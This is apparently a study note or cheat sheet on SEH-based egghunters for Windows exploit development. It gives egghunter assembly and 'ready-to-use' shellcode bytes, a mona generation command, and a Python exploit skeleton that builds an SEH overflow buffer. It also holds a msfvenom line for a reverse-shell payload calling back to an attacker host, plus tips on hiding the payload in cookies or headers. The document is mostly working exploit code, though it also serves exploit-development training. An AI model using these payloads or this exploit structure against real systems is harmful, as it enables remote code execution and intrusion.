---
tags:
  - Advanced
  - Binary_Exploitation
  - Debugging
  - Egghunter
  - Exploitation
  - SEH_Overflow
  - WinDbg
  - Windows
---

## SEH-Based Egghunter
resources: [Corelan Egghunter Tutorial](https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/)

> Cross-version compatible egghunter using SEH to handle access violations during memory search.

### SEH Egghunter Concept [Knowledge]
> [!info] Installs custom exception handler to catch access violations:
> - **Advantage**: Works across Windows versions (syscall-independent)
> - **Disadvantage**: Larger size (~60 bytes vs ~32 bytes)
> - **Mechanism**: When invalid memory accessed, SEH handler increments page

### SEH Egghunter Assembly
> Portable egghunter implementation.

```nasm
start:
    jmp get_seh_address
build_exception_record:
    pop ecx                     ; ECX = address of handler
    mov eax, 0x74303077         ; EAX = egg ("w00t")
    push ecx                    ; Push handler address
    push 0xffffffff             ; Push end of chain marker
    xor ebx, ebx                ; EBX = 0
    mov fs:[ebx], esp           ; Install our SEH handler
    sub ecx, 0x04               ; Adjust ECX for increment
    add ecx, 0x04               ; Increment (will be entry point after exception)

is_egg:
    inc ecx                     ; Next address
    push 0x02                   ; Size for scasd operations
    pop edx
    cld                         ; Clear direction flag
    mov edi, ecx                ; EDI = search address
    repe scasd                  ; Compare egg twice
    jnz is_egg                  ; If not found, continue
    jmp edi                     ; Egg found, jump to shellcode

get_seh_address:
    call build_exception_record
    push 0x0c                   ; Offset to get to address to increment
    pop ecx
    mov eax, [esp+ecx]          ; Get address from exception context
    mov cl, 0x0e                ;
    add dword ptr [eax+ecx], 0x06  ; Adjust EIP in context (+6 bytes)
    popad                       ; Restore registers
    cld                         ; Clear direction flag
    xor eax, eax                ; Return ExceptionContinueExecution
    ret
```

### SEH Egghunter Shellcode (Python)
> Ready-to-use SEH egghunter bytes.

```python
# SEH-based egghunter
# Egg: w00t (0x74303077)
egghunter_seh = (
    b"\xeb\x2a"                 # jmp get_seh_address
    b"\x59"                     # pop ecx
    b"\xb8\x77\x30\x30\x74"     # mov eax, 0x74303077
    b"\x51"                     # push ecx
    b"\x6a\xff"                 # push 0xffffffff
    b"\x33\xdb"                 # xor ebx, ebx
    b"\x64\x89\x23"             # mov fs:[ebx], esp
    b"\x83\xe9\x04"             # sub ecx, 4
    b"\x83\xc1\x04"             # add ecx, 4
    b"\x41"                     # inc ecx
    b"\x6a\x02"                 # push 0x02
    b"\x5a"                     # pop edx
    b"\xfc"                     # cld
    b"\x8b\xf9"                 # mov edi, ecx
    b"\xf3\xaf"                 # repe scasd
    b"\x75\xf6"                 # jnz is_egg
    b"\xff\xe7"                 # jmp edi
    b"\xe8\xd1\xff\xff\xff"     # call build_exception_record
    b"\x6a\x0c"                 # push 0x0c
    b"\x59"                     # pop ecx
    b"\x8b\x04\x0c"             # mov eax, [esp+ecx]
    b"\xb1\x0e"                 # mov cl, 0x0e
    b"\x01\x44\x08\x06"         # add [eax+ecx], 6
    b"\x61"                     # popad
    b"\xfc"                     # cld
    b"\x33\xc0"                 # xor eax, eax
    b"\xc3"                     # ret
)
```

### Generate with Mona
> Create SEH egghunter in Immunity Debugger.

```text
!mona egg -t w00t -wow64 -winver 10
```

### Windows 10 Compatibility
> SEH egghunter needs adjustments for Windows 10.

> Windows 10 uses different exception handling internals.
> Use `!mona egg -winver 10` for compatible egghunter.

### Complete Exploit Structure
> Using egghunter in a full exploit.

```python
import socket
import struct

# Configuration
target = "<TargetIP>"
port = <Port>
egg = b"w00t"

# SEH egghunter (32 bytes)
egghunter = b"\x66\x81\xca\xff\x0f..."  # Your egghunter

# Full shellcode with egg prepended
# msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f python -b "\x00"
shellcode = b""
shellcode += b"\xfc\xe8..."  # Generated shellcode

# Prepend egg to shellcode
payload_with_egg = egg + egg + shellcode

# Build overflow buffer
# Example: SEH overflow
offset_to_nseh = <Offset>
nseh = b"\xeb\x06\x90\x90"           # JMP SHORT +6
handler = struct.pack("<I", <PPR>)   # P/P/R address

buffer = b"A" * offset_to_nseh
buffer += nseh
buffer += handler
buffer += egghunter                   # Egghunter after handler
buffer += b"\x90" * 100               # Padding

# Shellcode placed elsewhere (e.g., different HTTP parameter)
# The egghunter will find it
```

### Testing Strategy
> Verify egghunter operation.

```text
0:000> bp <EgghunterStart>      ; Break at egghunter
0:000> g                         ; Run
; When hit, step through to verify search
0:000> s -a 0 L?7fffffff "w00tw00t"  ; Find egg in memory
```

### Egg Placement Strategies
> [!tip] Where to put the egg+shellcode:
> - **Same buffer, different location**: Earlier in overflow buffer
> - **Different parameter**: POST data, Cookie, User-Agent
> - **Heap allocation**: If application copies data to heap

